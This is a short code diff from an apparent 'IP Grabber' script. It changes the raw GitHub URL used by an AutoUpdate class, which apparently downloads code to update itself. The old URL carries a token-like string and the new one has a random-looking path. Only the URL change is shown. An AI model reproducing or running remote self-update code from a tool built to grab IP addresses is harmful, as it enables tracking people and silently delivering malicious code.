@@ -15,7 +15,7 @@ ctypes.windll.kernel32.SetConsoleTitleW("IP Grabber | by . Frefen#0726 | v" + __
 class AutoUpdate: #credit to K.Dot for this shit
     def __init__(self):
         self.code = (
-            "https://raw.githubusercontent.com/Frefen/IP/main/IPLOGGER?token=GHSAT0AAAAAACBYELJYDVX3MKRGZAXQS7EWZCNB6RQ"
+            "https://raw.githubusercontent.com/Frefen/Fixed/main/heokmrhokermhokemhokemrho"
         )
         self.update()
 
